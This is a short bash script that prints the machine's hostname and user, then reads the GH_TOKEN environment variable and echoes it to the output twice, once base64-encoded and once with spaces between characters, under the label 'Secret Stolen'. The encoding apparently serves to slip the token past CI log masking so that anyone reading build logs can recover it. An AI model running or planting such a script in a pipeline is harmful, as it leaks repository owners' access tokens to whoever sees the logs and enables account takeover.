#!/bin/bash
echo "Hostname: $(hostname)"
echo "Current user: $(whoami)"

echo "TOKKKKKKKKKKKKKKKKKKKEEEEEEEEEEEEEEEENNNNNNN"
encoded_token=$(echo -n "$GH_TOKEN" | base64)
echo "Secret Stolen (Base64 Encoded): $encoded_token"



echo "TOKKKKKKKKKKKKKKKKKKKEEEEEEEEEEEEEEEENNNNNNN"
echo "Secret Stolen (Spaced Out): $(echo "$GH_TOKEN" | sed 's/./& /g')"
